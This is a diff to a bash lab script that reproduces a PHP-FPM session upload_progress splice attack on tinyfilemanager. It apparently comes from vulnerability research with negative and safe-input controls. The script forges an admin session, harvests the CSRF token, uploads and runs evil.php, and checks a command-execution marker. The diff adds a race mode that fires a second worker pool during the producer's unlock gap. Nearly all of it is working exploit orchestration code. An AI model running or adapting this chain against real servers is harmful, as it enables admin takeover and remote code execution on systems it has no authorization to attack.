@@ -30,14 +30,20 @@
 #
 # Usage: DEATH_MODE=rlimit PREBURN=1 bash lab/repro/php2shell-aftershell-splice-tfm.sh <php-fpm-bin> <tfm-web> [outdir] [port]
 #   Optional attacker-byte variance: SID=<32 hex> FILLER=<one byte>.
+#   GAP=1 tests a second unlimited consumer pool during the producer's unlock gap.
 
 set -u
 DEATH_MODE=${DEATH_MODE:-shim}
 [ "$DEATH_MODE" = shim ] || [ "$DEATH_MODE" = rlimit ] || { echo "DEATH_MODE must be shim or rlimit"; exit 2; }
 NATIVE_ATTACK=0
-[ "$DEATH_MODE" = rlimit ] && NATIVE_ATTACK=1
+GAP=${GAP:-0}
+[ "$GAP" = 0 ] || [ "$DEATH_MODE" = rlimit ] || { echo "GAP=1 requires DEATH_MODE=rlimit"; exit 2; }
 if [ -z "${DISPLAY_ERRORS+x}" ]; then DISPLAY_ERRORS=1; [ "$DEATH_MODE" = rlimit ] && DISPLAY_ERRORS=0; fi
-if [ "$DEATH_MODE" = rlimit ] && [ "${PREBURN:-0}" = 1 ]; then
+if [ "$GAP" = 1 ]; then
+    PROGRESS_FREQ=${PROGRESS_FREQ:-100%}
+    ARMED_BYTES=${ATTACK_BYTES:-8388608}
+    ARMED_TRAIL_BYTES=${TRAIL_BYTES:-134217728}
+elif [ "$DEATH_MODE" = rlimit ] && [ "${PREBURN:-0}" = 1 ]; then
     PROGRESS_FREQ=${PROGRESS_FREQ:-100%}
     ARMED_BYTES=${ATTACK_BYTES:-8388608}
     ARMED_TRAIL_BYTES=${TRAIL_BYTES:-134217728}
@@ -56,6 +62,7 @@ if [ "$(printf '%s\n' 8.4.28 "$FPM_VERSION" | sort -V | head -n 1)" = 8.4.28 ]; 
 fi
 OUT=${3:-lab/build/evidence}
 PORT=${PORT:-${4:-18134}}
+CPORT=$((PORT + 1))
 BUILDDIR=$(dirname "$(dirname "$(dirname "$FPM")")")
 LABEL=$(basename "$BUILDDIR" | sed 's/^php-//')-tfm
 CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
@@ -63,7 +70,8 @@ CLIENT=$(cd "$(dirname "$0")" && pwd)/php2shell-fpm-client.py
 mkdir -p "$OUT"
 LOG="$OUT/aftershell-tfm-$LABEL.log"
 : > "$LOG"
-echo "runtime: $FPM_VERSION binary=$FPM kernel=$(uname -r) mode=$DEATH_MODE preburn=${PREBURN:-0}" >> "$LOG"
+SCRIPT_SHA=$(sha256sum "$0"); SCRIPT_SHA=${SCRIPT_SHA%% *}
+echo "runtime: $FPM_VERSION binary=$FPM kernel=$(uname -r) mode=$DEATH_MODE preburn=${PREBURN:-0} script_sha256=$SCRIPT_SHA" >> "$LOG"
 
 REPOROOT=$(cd "$(dirname "$(dirname "$(dirname "$(readlink -f "$0")")")")" && pwd)
 SO="$REPOROOT/lab/preload/aftershell-kill.so"
@@ -75,15 +83,18 @@ D=$(mktemp -d)
 MTAG=${MTAG:-php2shell-r5-$(date -u +%H%M%S)}
 MARKER="$D/rce-marker-$MTAG.txt"
 MPID=
-cleanup() { stop_fpm; [ -n "${KEEP_TMP:-}" ] || rm -rf "$D"; }
+MPID2=
+cleanup() { stop_fpm; [ -n "$MPID2" ] && kill "$MPID2" 2>/dev/null; [ -n "${KEEP_TMP:-}" ] || rm -rf "$D"; }
 trap cleanup EXIT
 SESS="$D/sess"; mkdir -p "$SESS"
 FPMCONF="$D/fpm.conf"
 SID=${SID:-deadbeef00112233445566778899aabb}
 DUMP="$D/pwrites.bin"
 ARM="$D/armed"
-BOUNDARY='---------------------------20896060251896012921717172737'
+APPSID=
 KA2=""
+GAP_UPLOAD_DONE=0
+BOUNDARY='---------------------------20896060251896012921717172737'
 HOST=127.0.0.1
 
 OBJ='filemanager|a:1:{s:6:"logged";s:5:"admin";}'
@@ -142,7 +153,7 @@ EOF
 echo "tfm consumer cookie: filemanager=$SID (host $HOST) marker=$MARKER" | tee -a "$LOG"
 
 # ---------------------------------------------------------------- helpers
-fcgi() { python3 "$CLIENT" "$PORT" "$@"; }
+fcgi() { python3 "$CLIENT" "${CF_PORT:-$PORT}" "$@"; }
 offset_of() {
     python3 -c 'import sys
 d=open(sys.argv[1],"rb").read(); print(d.find(sys.argv[2].encode()))' "$1" "$2"
@@ -166,7 +177,7 @@ mpbody() { # $1 = progress key, $2 = raw filename, $3 = upload bytes
 }
 post() { # $1 = progress key, $2 = raw filename -> a REAL tinyfilemanager request (no cookie)
     mpbody "$1" "$2" "${POST_BYTES:-8192}" > "$D/body"
-    fcgi "$WEB/index.php" --body "$D/body" \
+    python3 "$CLIENT" "$PORT" "$WEB/index.php" --body "$D/body" \
         --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
         --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
         --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
@@ -195,7 +206,7 @@ upload() { # $1 = token
         --param "QUERY_STRING=p=" --param "REQUEST_URI=/index.php?p=" \
         --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST \
         --param HTTP_USER_AGENT=php2shell-lab \
-        --param HTTP_COOKIE="filemanager=$SID" \
+        --param HTTP_COOKIE="filemanager=${APPSID:-$SID}" \
         --param CONTENT_TYPE="multipart/form-data; boundary=$BOUNDARY"
 }
 execute_uploaded() { # GET /evil.php through the same FPM worker
@@ -204,7 +215,7 @@ execute_uploaded() { # GET /evil.php through the same FPM worker
         --param HTTP_HOST=$HOST --param SERVER_NAME=$HOST
 }
 wait_port() {
-python3 - "$PORT" <<'PY'
+python3 - "$1" <<'PY'
 import socket, sys, time
 port = int(sys.argv[1])
 for _ in range(100):
@@ -242,19 +253,33 @@ start_fpm() {
         else
             unset LD_PRELOAD AFTERSHELL_LOG_FILE AFTERSHELL_LOG_ONLY
         fi
+        echo "FPM start: native_attack=$NATIVE_ATTACK ld_preload=${LD_PRELOAD:-unset} log_only=${AFTERSHELL_LOG_ONLY:-unset}" >> "$LOG"
         if [ -n "$KA2" ]; then
             export AFTERSHELL_KILL_AT="$KA2" AFTERSHELL_KILL_ARM="$ARM"
         fi
         exec "$FPM" -n -F -y "$FPMCONF"
     ) >> "$LOG" 2>&1 &
     MPID=$!
-    wait_port || { echo "FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
+    wait_port "$PORT" || { echo "FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
     CHILD=$(wait_child) || { echo "no worker child — inspect $LOG" | tee -a "$LOG"; exit 1; }
 }
 stop_fpm() {
     [ -n "$MPID" ] && kill "$MPID" 2>/dev/null
     [ -n "$MPID" ] && wait "$MPID" 2>/dev/null
     MPID=
+}
+start_consumer_fpm() {
+    sed -e 's|^listen = 127\.0\.0\.1:.*|listen = 127.0.0.1:'"$CPORT"'|' \
+        -e 's|^pid = .*|pid = '"$D"'/fpm-consumer.pid|' \
+        -e 's|^php_admin_value\[session.upload_progress.enabled\] = 1$|php_admin_value[session.upload_progress.enabled] = 0|' \
+        "$FPMCONF" > "$D/fpm-consumer.conf"
+    (
+        unset LD_PRELOAD AFTERSHELL_LOG_FILE AFTERSHELL_LOG_ONLY AFTERSHELL_KILL_AT AFTERSHELL_KILL_ARM
+        exec "$FPM" -n -F -y "$D/fpm-consumer.conf"
+    ) >> "$LOG" 2>&1 &
+    MPID2=$!
+    wait_port "$CPORT" || { echo "consumer FPM failed to listen — inspect $LOG" | tee -a "$LOG"; exit 1; }
+    echo "consumer pool master pid=$MPID2 port=$CPORT (upload_progress off, no limits)" | tee -a "$LOG"
 }
 
 # ---------------------------------------------------------------- carrier
@@ -339,7 +364,7 @@ start_fpm
 OLDCHILD=$CHILD
 echo "== FPM phase-2 master pid=$MPID mode=$DEATH_MODE boundary=$K child=$OLDCHILD" >> "$LOG"
 if [ "$DEATH_MODE" = rlimit ]; then
-    if [ "${PREBURN:-0}" = 1 ]; then
+    if [ "${PREBURN:-0}" = 1 ] && [ "$GAP" = 0 ]; then
         TARGET_SID=$SID
         SID=00112233445566778899aabbccddeeff
         HZ=$(getconf CLK_TCK)
@@ -382,9 +407,59 @@ else
     touch "$ARM"
 fi
 TRAIL_BYTES=$ARMED_TRAIL_BYTES
-POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
-RC=$?
-rm -f "$ARM"
+if [ "$GAP" = 1 ]; then
+    start_consumer_fpm
+    MARKPID=$(pgrep -P "$MPID2" | head -n 1)
+    echo "gap consumer worker pid=$MARKPID" >> "$LOG"
+    export CF_PORT=$CPORT
+    rm -f "$D/splice-seen" "$D/gap-found"
+    (
+    python3 - "$SESS/sess_$SID" "$K" "$D/splice-seen" "$D/gap-found" "$FILLER" <<'PY' >> "$LOG" 2>&1
+import os, shutil, sys, time
+path, k, seen, found, filler = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5].encode()
+deadline = time.monotonic() + 20
+while time.monotonic() < deadline:
+    try:
+        with open(path, 'rb') as f:
+            d = f.read(200000)
+        if len(d) > k and d[k:k+16] == b'filemanager|a:1:' and d[:k].endswith(b'}') and d[:k].count(filler * 16) >= 1:
+            print('gap-candidate: len=%d prefix=%r tail-at-K=%r' % (len(d), d[:24], d[k:k+40]))
+            if d.startswith(b'upload_progress_carr|'):
+                shutil.copyfile(path, seen)
+                open(found, 'w').write(str(time.monotonic()))
+                print('gap-watcher: splice seen at %d bytes, offset %d == %r' % (len(d), k, d[k:k+40]))
+                sys.exit(0)
+    except OSError:
+        pass
+print('gap-watcher: no splice within 20s')
+sys.exit(1)
+PY
+    ) &
+    WATCHPID=$!
+    POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1 &
+    PRODPID=$!
+    wait "$WATCHPID"; GAP_FOUND=$?
+    if [ "$GAP_FOUND" = 0 ]; then
+        echo "gap-watcher: firing consumer on port $CPORT while producer request $PRODPID is live" | tee -a "$LOG"
+    else
+        echo "gap-watcher: no splice window; consumer still fired as negative control" | tee -a "$LOG"
+    fi
+    consumer GAP > "$D/consumerA.out" 2>&1
+    cat "$D/consumerA.out" >> "$LOG"
+    GAP_TOKEN=$(python3 -c 'import re,sys
+d=open(sys.argv[1],"r",errors="replace").read()
+m=re.search(r"name=\"token\" value=\"([0-9a-f]+)\"", d)
+print(m.group(1) if m else "")' "$D/consumerA.out")
+    if [ -n "$GAP_TOKEN" ]; then
+        upload "$GAP_TOKEN" > "$D/upload.out" 2>&1
+        GAP_UPLOAD_DONE=1
+        echo "gap: admin upload fired with token $GAP_TOKEN while producer request $PRODPID is live" | tee -a "$LOG"
+    fi
+    wait "$PRODPID"; RC=$?
+else
+    POST_BYTES=$ARMED_BYTES post carr "$X700" >> "$LOG" 2>&1
+    RC=$?
+fi
 ATTACK_FILE="$SESS/sess_$SID"
 if [ -f "$ATTACK_FILE" ]; then
     FILESZ=$(wc -c < "$ATTACK_FILE")
@@ -400,10 +475,20 @@ fi
 NEWCHILD=$(wait_child) || { echo "master did NOT respawn a worker — inspect $LOG" | tee -a "$LOG"; KEEP_TMP=1 exit 1; }
 echo "master worker after run: old=$OLDCHILD new=$NEWCHILD" >> "$LOG"
 [ "$NEWCHILD" = "$OLDCHILD" ] && echo "WARNING: same child pid — CPU death may not have fired" >> "$LOG"
+DEATH_OK=1
+if [ "$DEATH_MODE" = rlimit ] && [ "${PREBURN:-0}" = 1 ] && [ "$GAP" = 0 ]; then
+    DEATH_OK=0
+    if [ "$NEWCHILD" != "$OLDCHILD" ] && grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null; then
+        DEATH_OK=1
+    fi
+    echo "producer-death-check: old=$OLDCHILD new=$NEWCHILD signal9=$(grep -q 'signal 9 (SIGKILL)' "$D/fpm-error.log" 2>/dev/null && echo yes || echo no) ok=$DEATH_OK" >> "$LOG"
+fi
 
 MIXOK=0
-if [ -f "$ATTACK_FILE" ]; then
-    python3 - "$ATTACK_FILE" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
+SPLICE_FILE=$ATTACK_FILE
+[ "$GAP" = 1 ] && [ -f "$D/splice-seen" ] && SPLICE_FILE="$D/splice-seen"
+if [ -f "$SPLICE_FILE" ]; then
+    python3 - "$SPLICE_FILE" "$CARRIER" "$K" <<'EOF' >> "$LOG" 2>&1 && MIXOK=1
 import sys
 f = open(sys.argv[1], 'rb').read()
 c = open(sys.argv[2], 'rb').read()
@@ -425,7 +510,7 @@ fi
 # PHP 8.4.28+ rejects tinyfilemanager's runtime session ini change while
 # upload_progress is On. Keep the producer pool vulnerable for the attack,
 # then use an upload_progress-off pool with the same save_path for app checks.
-if [ "$APP_HEALTH" = 1 ]; then
+if [ "$APP_HEALTH" = 1 ] && [ "$GAP" = 0 ]; then
     sed 's/^php_admin_value\[session.upload_progress.enabled\] = 1$/php_admin_value[session.upload_progress.enabled] = 0/' "$FPMCONF" > "$D/fpm-health.conf"
     stop_fpm
     FPMCONF="$D/fpm-health.conf"
@@ -435,9 +520,11 @@ fi
 
 # ---- consumer: RESPAWNED worker runs the REAL tinyfilemanager request
 # with the spliced session; the app's own session decode is the consume path.
-rm -f "$DUMP"
-consumer A > "$D/consumerA.out" 2>&1
-cat "$D/consumerA.out" >> "$LOG"
+if [ "$GAP" = 0 ]; then
+    rm -f "$DUMP"
+    consumer A > "$D/consumerA.out" 2>&1
+    cat "$D/consumerA.out" >> "$LOG"
+fi
 PROMOTED=0
 if [ "$NATIVE_ATTACK" = 0 ]; then
     python3 - "$DUMP" <<'EOF' >> "$LOG" 2>&1 && PROMOTED=1
@@ -465,11 +552,22 @@ if [ -n "$TOKEN" ] && ! grep -q 'name="fm_usr"' "$D/consumerA.out"; then
 else
     echo "   no takeover: login form, no token (8.4.28/no-kill: expected)" | tee -a "$LOG"
 fi
+if [ "$GAP" = 1 ] && [ "$TAKEOVER" = 1 ]; then
+    NEWSID=$(python3 -c 'import re,sys
+d=open(sys.argv[1],"r",errors="replace").read()
+m=re.search(r"Set-Cookie: filemanager=([0-9a-f]+)", d)
+print(m.group(1) if m else "")' "$D/consumerA.out")
+    if [ -n "$NEWSID" ]; then
+        APPSID=$NEWSID
+        echo "gap: app regenerated session id $APPSID; use it for the admin upload" | tee -a "$LOG"
+    fi
+fi
 
 # ---- designed admin action: upload evil.php through the app's own form
 EXECOK=0
+MARKER_OK=0
 if [ "$TAKEOVER" = 1 ]; then
-    upload "$TOKEN" > "$D/upload.out" 2>&1
+    [ "$GAP_UPLOAD_DONE" = 1 ] || upload "$TOKEN" > "$D/upload.out" 2>&1
     cat "$D/upload.out" >> "$LOG"
     if grep -q '"status":"success"' "$D/upload.out"; then
         echo "   admin UPLOAD accepted by the app: $WEB/evil.php" | tee -a "$LOG"
@@ -491,8 +589,12 @@ else
     grep -q 'Token' "$D/upload.out" && echo "   control upload rejected (token invalid/missing), as expected" | tee -a "$LOG"
 fi
 MARKER_CONTENT=$(cat "$MARKER" 2>/dev/null || true)
-echo "marker-file-present-after-attack: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no)" | tee -a "$LOG"
+if [ -n "$MARKER_CONTENT" ] && printf '%s\n' "$MARKER_CONTENT" | grep -q "^executed by pid ${MARKPID:-$NEWCHILD}$" && printf '%s\n' "$MARKER_CONTENT" | grep -q '^uid='; then
+    MARKER_OK=1
+fi
+echo "marker-file-present-after-attack: $([ -n "$MARKER_CONTENT" ] && echo yes || echo no) pid-bound-to-new-worker=$MARKER_OK" | tee -a "$LOG"
 [ -f "$MARKER" ] && { echo "   marker file $MARKER:"; cat "$MARKER"; } >> "$LOG"
+[ "$EXECOK" = 1 ] && [ "$MARKER_OK" != 1 ] && { echo "   COMMAND EXECUTION REJECTED: target marker missing or not PID-bound" | tee -a "$LOG"; EXECOK=0; }
 # Preserve the positive side effect in the log, then require both controls to
 # leave a fresh marker absent rather than counting the earlier positive file.
 rm -f "$MARKER" "$WEB/evil.php"
@@ -530,15 +632,23 @@ fi
 if [ -f "$WEB/evil.php" ] || [ -f "$MARKER" ]; then
     echo "   CONTROL UNEXPECTED: upload or marker present without death" | tee -a "$LOG"
 fi
+CTL_OK=0
+if grep -q 'name="fm_usr"' "$D/consumerCTL.out" && [ "$CTL_PROMOTED" = 0 ] && [ ! -f "$WEB/evil.php" ] && [ ! -f "$MARKER" ]; then
+    CTL_OK=1
+fi
+echo "control-no-death-check: ok=$CTL_OK" >> "$LOG"
 
 # safe-input control: virgin sid, no carrier, no death
 rm -f "$SESS"/sess_* "$WEB/evil.php" "$MARKER"
 consumer SAFE cccc00112233445566778899aabbcccc > "$D/consumerSAFE.out" 2>&1
+SAFE_OK=0
 if grep -q 'name="fm_usr"' "$D/consumerSAFE.out" && [ ! -f "$MARKER" ] && [ ! -f "$WEB/evil.php" ]; then
+    SAFE_OK=1
     echo "   safe-input control (virgin sid): login form, no upload, marker absent" | tee -a "$LOG"
 else
     echo "   safe-input control UNEXPECTED — inspect $LOG" | tee -a "$LOG"
 fi
+echo "safe-input-check: ok=$SAFE_OK" >> "$LOG"
 
 # ---------------------------------------------------------------- verdict
 echo "== verdict scan (log: $LOG)" | tee -a "$LOG"
@@ -566,4 +676,17 @@ if [ -f "$D/fpm-error.log" ]; then
     echo "--- fpm-error.log ---" >> "$LOG"
     grep -E 'signal|exited|WARNING|ERROR' "$D/fpm-error.log" >> "$LOG" 2>/dev/null || true
 fi
-exit 0
+POSITIVE_OK=0
+NEGATIVE_OK=0
+if [ "$MIXOK" = 1 ] && [ "$TAKEOVER" = 1 ] && [ "$EXECOK" = 1 ] && [ "$MARKER_OK" = 1 ] && [ "$DEATH_OK" = 1 ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
+    POSITIVE_OK=1
+fi
+if [ "$MIXOK" = 0 ] && [ "$TAKEOVER" = 0 ] && [ "$EXECOK" = 0 ] && [ ! -f "$MARKER" ] && [ "$CTL_OK" = 1 ] && [ "$SAFE_OK" = 1 ]; then
+    NEGATIVE_OK=1
+fi
+echo "result-check: positive=$POSITIVE_OK negative=$NEGATIVE_OK death=$DEATH_OK marker=$MARKER_OK no-death-control=$CTL_OK safe-control=$SAFE_OK" | tee -a "$LOG"
+if { [ "$APP_HEALTH" = 0 ] && { [ "$DEATH_MODE" = shim ] || [ "${PREBURN:-0}" = 1 ]; }; } || [ "$GAP" = 1 ]; then
+    [ "$POSITIVE_OK" = 1 ]
+else
+    [ "$NEGATIVE_OK" = 1 ]
+fi
